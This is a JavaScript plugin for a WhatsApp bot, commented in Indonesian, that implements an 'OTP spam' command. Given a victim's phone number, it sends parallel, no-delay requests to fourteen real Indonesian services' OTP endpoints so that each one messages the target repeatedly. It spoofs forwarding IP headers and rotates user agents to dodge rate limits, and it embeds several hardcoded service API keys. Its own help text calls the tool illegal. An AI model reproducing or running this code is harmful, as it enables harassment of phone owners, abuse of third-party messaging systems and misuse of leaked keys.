import axios from 'axios'

// ─── KONFIGURASI PLUGIN ──────────────────────────────────────
const pluginConfig = {
    name: 'spamotp',
    alias: ['otp', 'sotp'],
    category: 'owner',
    description: '⚠️ Spam OTP ke nomor target (NO DELAY)',
    usage: '.spamotp <nomor> [jumlah]',
    example: '.spamotp 62857xxxxxxx 3',
    isOwner: true,
    isPremium: false,
    isGroup: false,
    isPrivate: false,
    cooldown: 30,
    energi: 10,
    isEnabled: true
}

// ─── KONFIGURASI SPAM (NO DELAY) ─────────────────────────────
const SPAM_CONFIG = {
    retries: 0,              // Gak usah retry, langsung lanjut
    timeout: 10000,          // Timeout 10 detik
    delayMin: 0,             // Minimal delay = 0
    delayMax: 0,             // Maksimal delay = 0
    concurrency: 20,         // Kirim 20 request sekaligus (parallel)
}

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S921B) Chrome/120.0.0.0 Mobile Safari/537.36'
]

// ─── HELPERS ──────────────────────────────────────────────────
function rand(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min
}

function randomIp() {
    return `${rand(1,255)}.${rand(1,255)}.${rand(1,255)}.${rand(1,255)}`
}

function randomUa() {
    return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]
}

function randomEmail() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    let result = ''
    for (let i = 0; i < 10; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length))
    }
    return result + '@bwmyga.com'
}

function normalizePhone(phone) {
    let p = String(phone).replace(/\D/g, '')
    if (p.startsWith('0')) p = '62' + p.substring(1)
    if (!p.startsWith('62')) p = '62' + p
    return p
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms))
}

// ─── ENDPOINTS ─────────────────────────────────────────────────
function getEndpoints(phone) {
    const p08 = '0' + phone.substring(2)
    const p62 = phone
    const pNoCountry = phone.replace('62', '')
    const deviceId = String(rand(1000000000000000, 9999999999999999))
    const requestId = String(rand(1000000000000000, 9999999999999999))
    const email = randomEmail()

    return [
        {
            name: 'Maulagi',
            url: 'https://api.maulagi.id/api/v2/auth/check',
            json: { credentials: p62 },
            headers: { 'X-ML-KEY': 'B10JLPEP10' }
        },
        {
            name: 'Matahari',
            url: 'https://matahari-backend-prod.matahari.com/api/auth/re-activation',
            json: { mobileCountryCode: '', mobileNumber: p08, activationCode: '' }
        },
        {
            name: 'Pinhome',
            url: 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp',
            json: {
                accountType: 'customers',
                applicationType: 'Pinhome Web',
                countryCode: '62',
                medium: 'whatsapp',
                otpType: 'register',
                phoneNumber: pNoCountry
            }
        },
        {
            name: 'Bonus Belanja',
            url: 'https://www.bonusbelanja.com/api/auth/registration/app',
            json: { phone: p62, name: 'User', agreeTnc: true, agreeContact: false }
        },
        {
            name: 'Alodokter',
            url: 'https://www.alodokter.com/resend-otp',
            json: {
                user: { phone: p08, uuid: String(rand(10000000, 99999999)) },
                request_via: 'whatsapp'
            }
        },
        {
            name: 'Beautyhaul',
            url: 'https://www.beautyhaul.com/ajax/account/send_otp',
            json: { method: 'WhatsApp', phone: p62 }
        },
        {
            name: 'Gritero',
            url: 'https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id',
            json: {
                nama_lengkap: 'User',
                telepon: p08,
                email: `user${rand(1000,9999)}@mail.com`
            },
            headers: { Xid: String(rand(1000000, 9999999)), source: 'ocistok' }
        },
        {
            name: 'Internet Rakyat',
            url: 'https://internetrakyat.id/api/app/auth/send-otp-register',
            json: { phone_number: p08 },
            headers: { 'x-api-key': '280999!FTTH' }
        },
        {
            name: 'Dokterin',
            url: 'https://api.dokterin.id/user/v1/users/login',
            json: { phone: p62, tnc_accept: true, device_id: deviceId }
        },
        {
            name: 'Paper.id',
            url: 'https://api.paper.id/api/v1/auth/login',
            json: { method: 'whatsapp', phone: p08 },
            headers: {
                'x-paper-user-agent': 'Jupiter/7.19.5 desktop (windows) Firefox 152',
                'request-id': requestId
            }
        },
        {
            name: 'Bunda',
            url: 'https://cms.bunda.co.id/api/v1/auth/send-otp',
            json: { phone_number: p62, type: 'auth' }
        },
        {
            name: 'Fastwork',
            url: 'https://api.fastwork.id/auth/v2/signup.sendVerificationCode',
            json: { phone_number: p08 }
        },
        {
            name: 'Saturdays',
            url: 'https://api.saturdays.com/v2/user/otp/request',
            json: { phoneNumber: p62, channel: 'whatsapp' }
        },
        {
            name: 'Indodax',
            url: 'https://api.indodax.com/api/v1/otp/send',
            json: { email: email, flow: 'register', method: 'whatsapp', old_uuid: '' },
            headers: { key: 'bAGUG2WiLy', authorization: 'Bearer bAGUG2WiLy' }
        }
    ]
}

// ─── SEND REQUEST (NO DELAY) ─────────────────────────────────
async function sendRequest(endpoint) {
    const headers = {
        'Content-Type': 'application/json',
        'User-Agent': randomUa(),
        'X-Forwarded-For': randomIp(),
        'X-Real-IP': randomIp(),
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8',
        'Connection': 'keep-alive',
        ...(endpoint.headers || {})
    }

    // ─── NO DELAY! ───────────────────────────────────────────
    try {
        const resp = await axios.post(endpoint.url, endpoint.json, {
            headers,
            timeout: SPAM_CONFIG.timeout
        })

        const status = resp.status
        if ([200, 201, 202, 204].includes(status)) {
            return { success: true, name: endpoint.name, status }
        }

        return { 
            success: false, 
            name: endpoint.name, 
            status, 
            message: resp.data?.message || 'Gagal' 
        }

    } catch (err) {
        return { 
            success: false, 
            name: endpoint.name, 
            status: err.response?.status || 0, 
            message: err.message 
        }
    }
}

// ─── MAIN SPAM FUNCTION (NO DELAY, FULL SPEED) ──────────────
async function spamOtp(phone, count = 1) {
    try {
        phone = normalizePhone(phone)

        if (!phone || !/^62[0-9]{10,13}$/.test(phone)) {
            throw new Error('Nomor tidak valid! Format: 6281234567890')
        }

        if (count < 1) count = 1
        if (count > 10) count = 10

        const endpoints = getEndpoints(phone)
        const total = endpoints.length
        const allResults = []
        const start = Date.now()

        console.log(`[spamotp] 🔥 Target: ${phone}`)
        console.log(`[spamotp] 🔥 Total loop: ${count}x`)
        console.log(`[spamotp] 🔥 Total request: ${count * total}`)

        for (let loop = 0; loop < count; loop++) {
            console.log(`\n[spamotp] 🚀 Loop ${loop + 1}/${count} - SPAMMING ALL ENDPOINTS!`)
            
            // ─── KIRIM SEMUA ENDPOINT SECARA PARALLEL ──────
            const promises = endpoints.map((endpoint, i) => 
                sendRequest(endpoint).then(result => ({
                    ...result,
                    loop: loop + 1,
                    index: i + 1
                }))
            )
            
            const results = await Promise.all(promises)
            allResults.push(...results)
            
            // ─── LOG CEPAT ───────────────────────────────────
            const successCount = results.filter(r => r.success).length
            console.log(`[spamotp] ✅ Loop ${loop + 1}: ${successCount}/${total} success`)

            // ─── TIDAK ADA DELAY ANTAR LOOP! ───────────────
        }

        const elapsed = ((Date.now() - start) / 1000).toFixed(1)
        const success = allResults.filter(r => r.success).length
        const failed = allResults.filter(r => !r.success).length

        return {
            success: true,
            target: phone,
            loops: count,
            total: allResults.length,
            success,
            failed,
            elapsed,
            results: allResults
        }

    } catch (error) {
        console.error('[spamotp] Error:', error.message)
        return { success: false, error: error.message }
    }
}

// ─── HANDLER PLUGIN ──────────────────────────────────────────
async function handler(m, { sock }) {
    try {
        const args = m.args || []
        const prefix = m.prefix || '.'
        const targetPhone = args[0]?.trim()
        const loopCount = parseInt(args[1]) || 1

        // ─── HELP ─────────────────────────────────────────────
        if (!targetPhone) {
            return m.reply(
                `📱 *SPAM OTP - NO DELAY*\n\n` +
                `⚠️ *PERINGATAN:* Ini ilegal! Hanya untuk testing.\n\n` +
                `Gunakan: ${prefix}spamotp <nomor> [jumlah]\n` +
                `Contoh: ${prefix}spamotp 62857xxxxxxx 3\n\n` +
                `*Jumlah:* Maksimal 10x loop\n` +
                `*Kecepatan:* FULL SPEED (parallel request!)`
            )
        }

        // ─── VALIDASI ──────────────────────────────────────────
        const phone = normalizePhone(targetPhone)
        if (!phone || !/^62[0-9]{10,13}$/.test(phone)) {
            return m.reply(`❌ Nomor tidak valid! Gunakan format 62857xxxxxxx`)
        }

        const count = Math.min(Math.max(loopCount, 1), 10)
        if (count !== loopCount) {
            await m.reply(`⚠️ Jumlah diubah ke ${count} (maksimal 10)`)
        }

        await m.react('⏳')
        await m.reply(
            `🔥 *SPAM OTP FULL SPEED!*\n\n` +
            `📱 Target: *${phone}*\n` +
            `🔄 Loop: *${count}x*\n` +
            `📡 Total request: *${count * 14}*\n\n` +
            `⚡ *Gas terus tanpa jeda!*`
        )

        // ─── EKSEKUSI ──────────────────────────────────────────
        const result = await spamOtp(phone, count)

        // ─── RESPON ──────────────────────────────────────────
        if (result?.success) {
            await m.react('✅')

            const successful = result.results.filter(r => r.success)
            const failedList = result.results.filter(r => !r.success)

            let report = `📊 *HASIL SPAM OTP*\n\n` +
                `📱 Target: ${phone}\n` +
                `✅ Berhasil: ${successful.length}/${result.total}\n` +
                `❌ Gagal: ${failedList.length}/${result.total}\n` +
                `⏱️ Waktu: ${result.elapsed}s\n\n` +
                `*Endpoint Berhasil:*\n`

            // ─── GROUP BY ENDPOINT ──────────────────────────
            const grouped = {}
            successful.forEach(r => {
                if (!grouped[r.name]) grouped[r.name] = 0
                grouped[r.name]++
            })

            Object.entries(grouped).forEach(([name, count2]) => {
                report += `✅ ${name} (${count2}x)\n`
            })

            if (failedList.length > 0) {
                report += `\n❌ *Gagal:* ${failedList.map(r => r.name).join(', ')}`
            }

            return m.reply(report)
        } else {
            await m.react('❌')
            return m.reply(`❌ Gagal: ${result?.error || 'Unknown error'}`)
        }

    } catch (error) {
        console.error('[spamotp] ERROR:', error.message)
        await m.react('❌')
        return m.reply(`❌ *Error:* ${error.message?.slice(0, 200) || 'Unknown error'}`)
    }
}

// ─── EXPORT ──────────────────────────────────────────────────
export { pluginConfig as config, handler }